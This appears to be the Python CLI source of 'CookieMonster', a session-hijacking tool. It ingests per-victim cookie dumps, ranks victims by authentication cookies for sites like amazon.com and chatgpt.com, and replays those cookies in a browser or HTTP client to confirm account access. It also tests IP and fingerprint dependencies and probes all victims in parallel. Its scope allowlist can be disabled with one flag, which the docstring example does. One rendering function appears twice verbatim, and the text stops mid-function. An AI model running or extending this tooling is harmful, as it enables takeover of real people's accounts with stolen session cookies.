"""Interface de linha de comando do CookieMonster."""

from __future__ import annotations

import os
import json
import signal
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import click

from pathlib import Path

from . import __version__
from .ingest import ingest_dir
from .store.db import Store

from rich.console import Console
from rich.table import Table

console = Console()


def _load_store(db: str) -> Store:
    store = Store(db)
    store.init()
    return store


@click.group()
@click.version_option(__version__, prog_name="cookie-monster")
def cli():
    """CookieMonster - validador de session hijacking por cookie replay."""


@cli.command()
@click.option("--dir", "source_dir", type=click.Path(exists=True, file_okay=False,
                                                     path_type=Path), required=True,
              help="Diretorio raiz com as pastas de vítima (ex.: Cookies/)")
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True, help="Caminho do store SQLite")
@click.option("--sample", type=int, default=0,
              help="Limita a ingestao às N primeiras vítimas (teste)")
@click.option("--resume", is_flag=True,
              help="Pula vítimas já ingeridas (retomada de ingest incompleta)")
def ingest(source_dir: Path, db_path: Path, sample: int, resume: bool):
    """Ingere dumps de cookies (Netscape/JSON) no store SQLite."""
    store = _load_store(str(db_path))
    console.print("[bold]Ingerindo dumps de cookies...[/]")
    stats = ingest_dir(store, source_dir, sample=sample, resume=resume)
    console.print()

    table = Table(title="Ingestão concluída")
    table.add_column("Item", style="cyan")
    table.add_column("Valor", justify="right")
    for key in ("victims", "files", "json_files", "cookies", "malformed_lines"):
        table.add_row(key.replace("_", " "), str(stats[key]))
    table.add_row("pulados", str(stats.get("skipped", 0)))
    table.add_row("erros", str(len(stats["errors"])))
    console.print(table)

    if stats["errors"]:
        console.print("[yellow]Vítimas sem cookies:[/]")
        for err in stats["errors"][:20]:
            console.print(f"  {err}")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
def victims(db_path: Path):
    """Lista as vítimas ingeridas."""
    store = _load_store(str(db_path))
    rows = store.list_victims()
    table = Table(title="Vítimas")
    table.add_column("ID", justify="right", style="dim")
    table.add_column("Diretório")
    table.add_column("Layout")
    table.add_column("Cookies", justify="right")
    table.add_column("Domínios", justify="right")
    for row in rows:
        table.add_row(str(row["id"]), row["dir_name"], row["source_layout"],
                      str(row["cookie_count"]), str(row["domain_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} vítimas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, default=None, help="Filtra por ID de vítima")
@click.option("--domain", default=None, help="Filtra por domínio (ex.: amazon.com)")
def domains(db_path: Path, victim: int | None, domain: str | None):
    """Lista domínios e contagem de cookies."""
    store = _load_store(str(db_path))
    rows = store.list_domains(victim_id=victim, domain=domain)
    table = Table(title="Domínios")
    table.add_column("Victim ID", justify="right", style="dim")
    table.add_column("Domínio")
    table.add_column("Cookies", justify="right")
    for row in rows:
        table.add_row(str(row["victim_id"]), row["domain"], str(row["cookie_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} linhas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=10, show_default=True)
def best(db_path: Path, domain: str, limit: int):
    """Seleciona as melhores vítimas para um domínio (heurística de artefato auth)."""
    store = _load_store(str(db_path))
    rows = store.best_victims_for_domain(domain, limit=limit)
    table = Table(title=f"Melhores vítimas para {domain}")
    table.add_column("Victim ID", justify="right", style="dim")
    table.add_column("Diretório")
    table.add_column("Auth", justify="right")
    table.add_column("Total", justify="right")
    for row in rows:
        table.add_row(str(row["victim_id"]), row["dir_name"],
                      str(row["auth"]), str(row["total"]))
    console.print(table)


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True, help="ID da vítima")
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
              show_default=True)
@click.option("--path", "req_path", default="/", show_default=True,
              help="Path do alvo para matching RFC 6265")
@click.option("--limit", type=int, default=100, show_default=True)
@click.option("--show-value", is_flag=True, help="Exibe o valor do cookie")
def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
            limit: int, show_value: bool):
    """Lista cookies aplicáveis a um alvo, usando matching RFC 6265."""
    from .domain.matcher import applicable_cookies

    store = _load_store(str(db_path))
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=10000)
    host = domain.split("://")[-1].strip("/")
    matched = applicable_cookies(
        [dict(r) for r in raw], scheme=scheme, host=host, path=req_path
    )[:limit]

    table = Table(title=f"Cookies - vítima {victim} - {scheme}://{host}{req_path}")
    table.add_column("Nome")
    table.add_column("Domínio")
    table.add_column("Path")
    table.add_column("Secure", justify="center")
    table.add_column("HttpOnly", justify="center")
    table.add_column("HostOnly", justify="center")
    table.add_column("Expira", justify="right")
    if show_value:
        table.add_column("Valor")
    for row in matched:
        expiry = row["expires_epoch"]
        expiry_s = "sessão" if not expiry else str(expiry)
        if show_value:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s, row["value"])
        else:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s)
    console.print(table)
    console.print(f"[dim]Total: {len(matched)} cookies aplicáveis[/]")


# ---- Fase A: probe — pipeline unificado (best + cookies + inject + check) ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
              show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--url", default=None,
              help="URL alvo (padrão: scheme://host/req_path)")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--max-wait-ms", type=int, default=8000, show_default=True)
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo.")
def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
          channel: str, max_wait_ms: int, replay_mode: str, allow_unsafe_scope: bool):
    """Pipeline unificado: best + cookies + inject + check para um alvo.

    Saida amigavel mostrando a vitima escolhida, artefatos de autenticacao
    detectados, replay no navegador e estado final (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN).
    """
    from .domain.matcher import applicable_cookies
    from .validate.auth_state import CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")

    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    target_url = url or f"{scheme}://{host}{req_path}"

    best = store.best_victims_for_domain(domain, limit=1)
    if not best:
        console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
        return
    victim = best[0]
    console.print(f"[bold bright_white]=== CookieMonster: probe {domain} ===[/]")
    console.print(f"\n[1] [cyan]VITIMA SUGERIDA[/]")
    console.print(f"    vid=[yellow]{victim['victim_id']}[/yellow]  "
                  f"auth={victim['auth']}  total={victim['total']}")
    console.print(f"    arquivo={victim['dir_name'][:64]}")

    raw = store.list_cookies(victim_id=victim["victim_id"], domain=domain, limit=100000)
    matched = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
    auth_arts = [c for c in matched if is_auth_name(c["name"])]
    console.print(f"\n[2] [cyan]ARTEFATOS DE AUTENTICACAO[/]")
    if auth_arts:
        for c in auth_arts[:10]:
            console.print(f"    [green]>[/green] {c['name']:30}  auth  score=10+")
        if len(auth_arts) > 10:
            console.print(f"    [dim]...+ {len(auth_arts) - 10} mais[/dim]")
    else:
        console.print(f"    [yellow]Nenhum artefato auth classificado por nome[/yellow]")
    console.print(f"    [dim]{len(matched)} cookies aplicaveis no total[/dim]")

    console.print(f"\n[3] [cyan]REPLAY ({channel})[/]")
    res = _probe_one(store, victim["victim_id"], domain, scheme, req_path, target_url,
                    channel, replay_mode, max_wait_ms)
    if res.get("error"):
        console.print(f"    [red]erro: {res['error'][:120]}[/red]")
    else:
        console.print(f"    URL final: [cyan]{res.get('final_url', '?')[:100]}[/cyan]")
        if channel == "playwright":
            console.print(f"    Cookies enviados ao alvo: [green]{res['cookie_jar_count']}[/green]")

    _render_replay_result(res, console)

    diff = (res.get("result") or {}).get("differential") or {}
    if diff:
        bits = []
        for k, v in diff.items():
            if isinstance(v, dict):
                bits.append(f"{k}: base={v.get('baseline')} inj={v.get('injected')}")
            else:
                bits.append(f"{k}={v}")
        console.print(f"    [dim]diferencial: {' | '.join(bits[:5])}")

    from .report import json_out
    result = res.get("result") or {}
    evidence_blob = json_out.dumps({
        "state": res["state"], "confidence": res["confidence"],
        "differential": result.get("differential", {}),
        "baseline_evidence": result.get("baseline", {}),
        "injected_evidence": result.get("injected", {}),
    })
    run_id = store.record_run(
        victim["victim_id"], target_url, host, channel,
        state=res["state"], confidence=res["confidence"],
        evidence_json=evidence_blob,
        auth_context_json=json_out.dumps(result.get("auth_context", {})),
        reason=result.get("reason", ""),
    )
    console.print(f"[dim]run_id={run_id} salvo em runs[/dim]")


def _render_replay_result(res: dict, console) -> None:
    """Renderiza o bloco [4] REPLAY RESULT no formato M6.0 AuthContext.

    Separado do `probe` para facilitar testes (consome apenas o dict
    produzido por _probe_one).
    """
    console.print(f"\n[4] [cyan]REPLAY RESULT (M6.0 AuthContext)[/]")
    state = res["state"]
    conf = res["confidence"]
    result_obj = res.get("result") or {}

    # Mapeamento estendido (M6.0) + retrocompat com CONFIRMED/LIKELY/...
    color = {
        "AUTHENTICATED": "green", "CONFIRMED": "green",
        "CONTEXT_BOUND": "yellow", "LIKELY": "cyan",
        "IDP_BOUND": "yellow", "MFA_BLOCKED": "red",
        "BOT_BLOCKED": "red", "ANONYMOUS": "red",
        "INCONCLUSIVE": "yellow", "UNKNOWN": "yellow",
        "NO_COOKIES": "dim",
    }.get(state, "yellow")
    state_pt = {
        "AUTHENTICATED": "ACESSO CONFIRMADO",
        "CONFIRMED": "ACESSO CONFIRMADO",
        "CONTEXT_BOUND": "ACESSO CONTEXTO-DEPENDENTE",
        "LIKELY": "ACESSO PROVAVEL",
        "IDP_BOUND": "ACESSO BLOQUEADO POR IDP",
        "MFA_BLOCKED": "ACESSO BLOQUEADO POR MFA",
        "BOT_BLOCKED": "ACESSO BLOQUEADO POR ANTI-BOT",
        "ANONYMOUS": "ACESSO REJEITADO",
        "INCONCLUSIVE": "INDETERMINADO",
        "UNKNOWN": "INDETERMINADO",
        "NO_COOKIES": "SEM COOKIES",
    }
    console.print(f"    >>> Classification: [bold {color}]{state}[/] "
                  f"([bold]{state_pt.get(state, state)}[/])")
    console.print(f"    >>> Confidence:     [bold]{conf:.2f}[/]")

    # Reason canonica (M6.0).
    reason = result_obj.get("reason") or res.get("reason") or ""
    if reason:
        console.print(f"    >>> Reason:         [dim]{reason}[/dim]")

    # AuthContext (M6.0): mechanism, IdP, session type, deps.
    # auth_context dict e a fonte canonica. Fallback para res/result
    # apenas se ele nao existir.
    auth_ctx_dict = res.get("auth_context") or {}
    auth_mech = auth_ctx_dict.get("auth_mechanism") or "unknown"
    idp = auth_ctx_dict.get("identity_provider") or "none"
    session_t = auth_ctx_dict.get("session_type") or "unknown"
    deps = res.get("context_dependencies") or result_obj.get("context_dependencies") or []
    bot = bool(res.get("bot_challenge_detected")
               or result_obj.get("bot_challenge_detected", False)
               or auth_ctx_dict.get("bot_challenge_detected", False))
    mfa = bool(res.get("mfa_challenge_detected")
               or result_obj.get("mfa_challenge_detected", False)
               or auth_ctx_dict.get("mfa_challenge_detected", False))

    console.print(f"    >>> Mechanism:      [cyan]{auth_mech}[/cyan]")
    if idp not in ("none", "unknown"):
        console.print(f"    >>> IdP:            [yellow]{idp}[/yellow] "
                      f"[dim](login via terceiro - cookies podem requerer contexto adicional)[/dim]")
    else:
        console.print(f"    >>> IdP:            [dim]{idp}[/dim]")
    console.print(f"    >>> Session type:   [dim]{session_t}[/dim]")
    if deps:
        console.print(f"    >>> Dependencies:   [yellow]{', '.join(deps)}[/yellow] "
                      f"[dim](replay pode depender desses contextos)[/dim]")
    if bot:
        console.print(f"    >>> [red]Anti-bot challenge detectado[/red]")
    if mfa:
        console.print(f"    >>> [red]MFA challenge detectado[/red]")

    # Mensagem especifica por classification.
    if state in ("ANONYMOUS",):
        console.print(f"    [red]>>> O servidor RECUSOU os cookies.[/red]")
    elif state in ("AUTHENTICATED", "CONFIRMED"):
        console.print(f"    [green]>>> Identidade diferencial detectada. Acesso provavel.[/green]")
    elif state in ("CONTEXT_BOUND", "LIKELY"):
        if result_obj.get("api_only_confirmed"):
            console.print(f"    [cyan]>>> API reconheceu identidade, mas UI nao refletiu.[/cyan]")
        else:
            console.print(f"    [cyan]>>> UI autenticada diferencial, sem identidade explicita.[/cyan]")
    elif state == "IDP_BOUND":
        console.print(f"    [yellow]>>> Sessao requer validacao no Identity Provider externo.[/yellow]")
        console.print(f"    [dim]    (cf_clearance expirado / IdP check de IP/fingerprint).[/dim]")
    elif state == "MFA_BLOCKED":
        console.print(f"    [yellow]>>> IdP exige MFA. Cookie sozinho nao basta.[/yellow]")
    elif state == "BOT_BLOCKED":
        console.print(f"    [yellow]>>> Anti-bot challenge bloqueou replay.[/yellow]")
        console.print(f"    [dim]    (Cloudflare, reCAPTCHA, DataDome, etc).[/dim]")
    elif state == "NO_COOKIES":
        console.print(f"    [yellow]>>> Nenhum cookie aplicavel para a URL.[/yellow]")
    else:
        console.print(f"    [yellow]>>> Evidencia insuficiente. Investigue manualmente.[/yellow]")

    # Cadeia de evidencias (top 5 mais relevantes).
    auth_ctx_dict = res.get("auth_context") or {}
    evidence_list = auth_ctx_dict.get("evidence") or []
    if evidence_list:
        console.print(f"\n    [dim]Evidence chain (top 5 de {len(evidence_list)}):[/dim]")
        for ev in evidence_list[:5]:
            t = ev.get("type", "?")
            v = ev.get("value", "")
            conf_ev = ev.get("confidence", 0)
            src = ev.get("source", "?")
            v_short = str(v)[:60] + ".." if len(str(v)) > 62 else str(v)
            console.print(f"      [dim][{src}] {t} (conf {conf_ev:.2f}): {v_short}[/dim]")
    # Hints.
    hints = res.get("hints") or result_obj.get("hints") or []
    if hints:
        console.print(f"    [dim]Hints: {', '.join(hints)}[/dim]")


def _render_replay_result(res: dict, console) -> None:
    """Renderiza o bloco [4] REPLAY RESULT no formato M6.0 AuthContext.

    Separado do `probe` para facilitar testes (consome apenas o dict
    produzido por _probe_one).
    """
    console.print(f"\n[4] [cyan]REPLAY RESULT (M6.0 AuthContext)[/]")
    state = res["state"]
    conf = res["confidence"]
    result_obj = res.get("result") or {}

    # Mapeamento estendido (M6.0) + retrocompat com CONFIRMED/LIKELY/...
    color = {
        "AUTHENTICATED": "green", "CONFIRMED": "green",
        "CONTEXT_BOUND": "yellow", "LIKELY": "cyan",
        "IDP_BOUND": "yellow", "MFA_BLOCKED": "red",
        "BOT_BLOCKED": "red", "ANONYMOUS": "red",
        "INCONCLUSIVE": "yellow", "UNKNOWN": "yellow",
        "NO_COOKIES": "dim",
    }.get(state, "yellow")
    state_pt = {
        "AUTHENTICATED": "ACESSO CONFIRMADO",
        "CONFIRMED": "ACESSO CONFIRMADO",
        "CONTEXT_BOUND": "ACESSO CONTEXTO-DEPENDENTE",
        "LIKELY": "ACESSO PROVAVEL",
        "IDP_BOUND": "ACESSO BLOQUEADO POR IDP",
        "MFA_BLOCKED": "ACESSO BLOQUEADO POR MFA",
        "BOT_BLOCKED": "ACESSO BLOQUEADO POR ANTI-BOT",
        "ANONYMOUS": "ACESSO REJEITADO",
        "INCONCLUSIVE": "INDETERMINADO",
        "UNKNOWN": "INDETERMINADO",
        "NO_COOKIES": "SEM COOKIES",
    }
    console.print(f"    >>> Classification: [bold {color}]{state}[/] "
                  f"([bold]{state_pt.get(state, state)}[/])")
    console.print(f"    >>> Confidence:     [bold]{conf:.2f}[/]")

    # Reason canonica (M6.0).
    reason = result_obj.get("reason") or res.get("reason") or ""
    if reason:
        console.print(f"    >>> Reason:         [dim]{reason}[/dim]")

    # AuthContext (M6.0): mechanism, IdP, session type, deps.
    # auth_context dict e a fonte canonica. Fallback para res/result
    # apenas se ele nao existir.
    auth_ctx_dict = res.get("auth_context") or {}
    auth_mech = auth_ctx_dict.get("auth_mechanism") or "unknown"
    idp = auth_ctx_dict.get("identity_provider") or "none"
    session_t = auth_ctx_dict.get("session_type") or "unknown"
    deps = res.get("context_dependencies") or result_obj.get("context_dependencies") or []
    bot = bool(res.get("bot_challenge_detected")
               or result_obj.get("bot_challenge_detected", False)
               or auth_ctx_dict.get("bot_challenge_detected", False))
    mfa = bool(res.get("mfa_challenge_detected")
               or result_obj.get("mfa_challenge_detected", False)
               or auth_ctx_dict.get("mfa_challenge_detected", False))

    console.print(f"    >>> Mechanism:      [cyan]{auth_mech}[/cyan]")
    if idp not in ("none", "unknown"):
        console.print(f"    >>> IdP:            [yellow]{idp}[/yellow] "
                      f"[dim](login via terceiro - cookies podem requerer contexto adicional)[/dim]")
    else:
        console.print(f"    >>> IdP:            [dim]{idp}[/dim]")
    console.print(f"    >>> Session type:   [dim]{session_t}[/dim]")
    if deps:
        console.print(f"    >>> Dependencies:   [yellow]{', '.join(deps)}[/yellow] "
                      f"[dim](replay pode depender desses contextos)[/dim]")
    if bot:
        console.print(f"    >>> [red]Anti-bot challenge detectado[/red]")
    if mfa:
        console.print(f"    >>> [red]MFA challenge detectado[/red]")

    # Mensagem especifica por classification.
    if state in ("ANONYMOUS",):
        console.print(f"    [red]>>> O servidor RECUSOU os cookies.[/red]")
    elif state in ("AUTHENTICATED", "CONFIRMED"):
        console.print(f"    [green]>>> Identidade diferencial detectada. Acesso provavel.[/green]")
    elif state in ("CONTEXT_BOUND", "LIKELY"):
        if result_obj.get("api_only_confirmed"):
            console.print(f"    [cyan]>>> API reconheceu identidade, mas UI nao refletiu.[/cyan]")
        else:
            console.print(f"    [cyan]>>> UI autenticada diferencial, sem identidade explicita.[/cyan]")
    elif state == "IDP_BOUND":
        console.print(f"    [yellow]>>> Sessao requer validacao no Identity Provider externo.[/yellow]")
        console.print(f"    [dim]    (cf_clearance expirado / IdP check de IP/fingerprint).[/dim]")
    elif state == "MFA_BLOCKED":
        console.print(f"    [yellow]>>> IdP exige MFA. Cookie sozinho nao basta.[/yellow]")
    elif state == "BOT_BLOCKED":
        console.print(f"    [yellow]>>> Anti-bot challenge bloqueou replay.[/yellow]")
        console.print(f"    [dim]    (Cloudflare, reCAPTCHA, DataDome, etc).[/dim]")
    elif state == "NO_COOKIES":
        console.print(f"    [yellow]>>> Nenhum cookie aplicavel para a URL.[/yellow]")
    else:
        console.print(f"    [yellow]>>> Evidencia insuficiente. Investigue manualmente.[/yellow]")

    # Cadeia de evidencias (top 5 mais relevantes).
    auth_ctx_dict = res.get("auth_context") or {}
    evidence_list = auth_ctx_dict.get("evidence") or []
    if evidence_list:
        console.print(f"\n    [dim]Evidence chain (top 5 de {len(evidence_list)}):[/dim]")
        for ev in evidence_list[:5]:
            t = ev.get("type", "?")
            v = ev.get("value", "")
            conf_ev = ev.get("confidence", 0)
            src = ev.get("source", "?")
            v_short = str(v)[:60] + ".." if len(str(v)) > 62 else str(v)
            console.print(f"      [dim][{src}] {t} (conf {conf_ev:.2f}): {v_short}[/dim]")
    # Hints.
    hints = res.get("hints") or result_obj.get("hints") or []
    if hints:
        console.print(f"    [dim]Hints: {', '.join(hints)}[/dim]")


# ---- Fase M6.2: matrix -- replay matrix para identificar dependencias ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Dominio alvo (ex.: chatgpt.com)")
@click.option("--victim", type=int, default=None,
              help="ID da vitima (default: melhor para o dominio)")
@click.option("--url", default=None,
              help="URL alvo (default: https://<host>/)")
@click.option("--max-variants", type=int, default=5, show_default=True,
              help="Maximo de variantes da matriz a executar (5 = canonica).")
@click.option("--stop-when", type=click.Choice(["authenticated", "bot_blocked",
                                                   "anonymous", "none"]),
              default="authenticated", show_default=True,
              help="Stop condition para parar a matriz cedo.")
@click.option("--allow-unsafe-scope", is_flag=True)
def matrix(db_path: Path, domain: str, victim: int, url: str,
           max_variants: int, stop_when: str, allow_unsafe_scope: bool):
    """Executa matriz de replay (M6.2) para identificar dependencias.

    A matriz combina variacoes passiveis de (network, browser, cookies)
    e infere automaticamente o que a sessao reproduzida depende:
      - cookie_only: cookies sozinhos bastam.
      - network_bound: exige IP/ASN da vitima.
      - browser_bound: exige fingerprint do navegador.
      - context: exige combinacao de contexto adicional.

    Para uso em LAB. Em producao use apenas com autorizacao e rate limit.

    Exemplo:
        python -m cookiemonster matrix --domain chatgpt.com --allow-unsafe-scope
    """
    from .replay import (
        ContextVariant, NetworkContext, BrowserContext, CookiesContext,
        build_matrix, CANONICAL_VARIANTS, ReplayMatrix,
    )
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")
    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
        return

    if victim is None:
        best = store.best_victims_for_domain(domain, limit=1)
        if not best:
            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
            return
        victim = best[0]["victim_id"]
        console.print(f"[dim]Vitima selecionada automaticamente: vid={victim}[/dim]")

    target_url = url or f"https://{host}/"
    console.print(f"[bold bright_white]=== CookieMonster: matrix {domain} ===[/]")
    console.print(f"  vitima: vid={victim}")
    console.print(f"  URL alvo: {target_url}")
    console.print(f"  max_variants: {max_variants}  stop_when: {stop_when}\n")

    variants = build_matrix(include_baseline=True)[:max_variants]
    console.print(f"[dim]Variantes da matriz:[/dim]")
    for i, v in enumerate(variants, 1):
        console.print(f"  [dim]{i}. {v.label}[/dim]")
    console.print()

    # Executor: delega para _probe_one com ajuste de cookies.
    from .domain.matcher import applicable_cookies
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    matched = applicable_cookies([dict(r) for r in raw], "https", host, "/")

    def executor(variant: ContextVariant) -> dict:
        if variant.cookies == CookiesContext.NONE:
            cookies_to_send = []
        else:
            cookies_to_send = matched
        # Por enquanto channel=httpx (rapido, ~1s/variant).
        # network_alternate/PRESERVED ainda nao implementados - placeholder.
        try:
            from .inject import httpx_client
            r = httpx_client.get(target_url, cookies_to_send)
            r.setdefault("sent_cookies", [])
            from .auth import detect_all, classify
            observation = {
                "url": target_url,
                "body": (r.get("text") or "")[:8000],
                "html": (r.get("text") or "")[:8000],
                "cookie_names": [c.get("name", "") for c in (r.get("cookie_jar") or [])
                                 if isinstance(c, dict)] or r.get("cookie_jar", []),
            }
            ctx = detect_all(observation, target=host)
            inj_ev = r.get("evidence", {})
            base_ev = {}
            result = classify(inj_ev, base_ev, ctx)
            return {
                "auth_state": result["state"].upper(),
                "confidence": result["confidence"],
                "reason": result["reason"],
                "dependencies": result["context_dependencies"],
                "final_url": r.get("final_url", ""),
                "error": r.get("error"),
            }
        except Exception as exc:
            return {
                "auth_state": "ERROR",
                "confidence": 0.0,
                "reason": "executor_exception",
                "dependencies": [],
                "final_url": "",
                "error": str(exc),
            }

    # Stop condition.
    stop_when_arg = None if stop_when == "none" else stop_when
    matrix_obj = ReplayMatrix(executor=executor, max_variants=max_variants)

    # Log por variant em tempo real.
    import time as _time
    for v in variants:
        t0 = _time.time()
        out = executor(v)
        from .replay.context import VariantResult as _VR
        vr = _VR(
            variant=v,
            auth_state=out.get("auth_state", "ERROR"),
            confidence=out.get("confidence", 0.0),
            reason=out.get("reason", ""),
            dependencies=out.get("dependencies", []),
            final_url=out.get("final_url", ""),
            error=out.get("error"),
            duration_sec=_time.time() - t0,
        )
        matrix_obj.results.append(vr)
        elapsed = sum(r.duration_sec for r in matrix_obj.results)
        color = {"AUTHENTICATED": "green", "ANONYMOUS": "red",
                 "BOT_BLOCKED": "red", "MFA_BLOCKED": "yellow",
                 "IDP_BOUND": "yellow", "CONTEXT_BOUND": "yellow",
                 "INCONCLUSIVE": "yellow", "ERROR": "red"}.get(vr.auth_state, "dim")
        console.print(
            f"  [dim]{vr.variant.label:35}[/dim] "
            f"state=[{color}]{vr.auth_state:13}[/] "
            f"conf={vr.confidence:.2f} "
            f"[dim]{vr.duration_sec:.1f}s[/dim]",
            highlight=False,
        )
        # Persiste cada variant como run separado.
        from .report import json_out
        run_id = store.record_run(
            victim_id=victim, target_url=target_url, target_domain=host,
            channel="httpx", state=vr.auth_state, confidence=vr.confidence,
            evidence_json=json_out.dumps({"variant": vr.variant.to_dict(),
                                          "reason": vr.reason}),
            auth_context_json=json_out.dumps({}),
            reason=vr.reason,
            variant_label=vr.variant.label,
        )
        # Stop condition check.
        from .replay.matrix import should_stop
        stop, why = should_stop(matrix_obj.results)
        if stop:
            console.print(f"\n[dim]  stop: {why}[/dim]")
            break

    # Resumo final + dependency analysis.
    summary = matrix_obj.summary()
    deps = summary["dependencies"]
    console.print(f"\n[bold]=== DEPENDENCY ANALYSIS ===[/bold]")
    console.print(f"  Variantes executadas: {summary['count']}")
    for label, state in deps["variant_states"].items():
        color = {"AUTHENTICATED": "green", "ANONYMOUS": "red",
                 "BOT_BLOCKED": "red", "MFA_BLOCKED": "yellow",
                 "IDP_BOUND": "yellow", "CONTEXT_BOUND": "yellow",
                 "INCONCLUSIVE": "yellow", "ERROR": "red"}.get(state, "dim")
        console.print(f"  [dim]{label:22}[/dim] state=[{color}]{state}[/]")

    console.print(f"\n  Dependencies inferred: [cyan]{', '.join(deps['dependencies'])}[/cyan]")
    console.print(f"\n  [dim]{deps['summary']}[/dim]")

    if "cookie_only" in deps["dependencies"]:
        console.print(f"\n  [green]>>> Os cookies reproduzem a sessao sem dependencias extras.[/green]")
    elif "network" in deps["dependencies"] or "browser" in deps["dependencies"]:
        console.print(f"\n  [yellow]>>> A sessao exige contexto adicional (rede/browser).[/yellow]")
        console.print(f"  [dim]    Em lab, configure SOCKS5/IP da vitima + fingerprint preservado.[/dim]")
    elif "inconclusive" in deps["dependencies"]:
        console.print(f"\n  [yellow]>>> Evidencia insuficiente. Tente com mais variantes ou channel=playwright.[/yellow]")


# ---- Fase A2: probe-all -- todas as vitimas do dominio em paralelo ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=0, show_default=True,
              help="Limitar a N melhores vitimas (0 = todas)")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--workers", type=int, default=3, show_default=True,
              help="Workers paralelos (Playwright pesado: max 4)")
@click.option("--max-wait-ms", type=int, default=6000, show_default=True)
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo.")
def probe_all(db_path: Path, domain: str, limit: int, channel: str,
              workers: int, max_wait_ms: int, replay_mode: str,
              allow_unsafe_scope: bool):
    """Executa probe em TODAS as vitimas do dominio (em paralelo).

    Saida amigavel mostrando resumo por estado, ultimos runs e destaque
    de acessos confirmados com comando para replicar.

    Para grandes datasets, combine --limit N (top N vitimas por auth) com
    --channel httpx (probe rapido, ~1s/vitima) para triagem.
    """
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")
    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
        return

    target_url = f"https://{host}/"
    best = store.best_victims_for_domain(domain, limit=limit if limit > 0 else 100000)
    if not best:
        console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
        return
    victims = best
    console.print(f"[bold bright_white]=== CookieMonster: probe-all {domain} ===[/]")
    console.print(f"  Total de vitimas candidatas: [yellow]{len(victims)}[/yellow]")
    console.print(f"  Canal: {channel}  Workers: {workers}  Replay-mode: {replay_mode}")
    console.print(f"  [dim]Pressione Ctrl+C a qualquer momento para cancelar graciosamente.[/dim]\n")

    start = time.time()
    results = []

    def run_for(target):
        vid = target["victim_id"]
        try:
            r = _probe_one(store, vid, domain, "https", "/", target_url,
                           channel, replay_mode, max_wait_ms)
            r["victim_id"] = vid
            r["auth"] = target.get("auth", 0)
            r["total"] = target.get("total", 0)
            return r
        except Exception as exc:
            return {"victim_id": vid, "state": "ERROR", "error": str(exc)}

    cancelled = [False]

    def _sigint(_signum, _frame):
        if cancelled[0]:
            console.print("\n[bold red]Forcando abort...[/bold red]")
            os._exit(1)
        cancelled[0] = True
        console.print("\n[bold yellow]>>> Ctrl+C detectado. Aguardando workers atuais finalizarem...[/bold yellow]")
        console.print("[dim]    (pressione Ctrl+C de novo para forcar abort)[/dim]")

    def _watch_keypress():
        """Em Windows: fica checando ENTER via msvcrt. Em outros: usa select stdin."""
        try:
            import msvcrt  # type: ignore
            while not cancelled[0]:
                if msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if ch in ("\r", "\n", "q", "Q"):
                        cancelled[0] = True
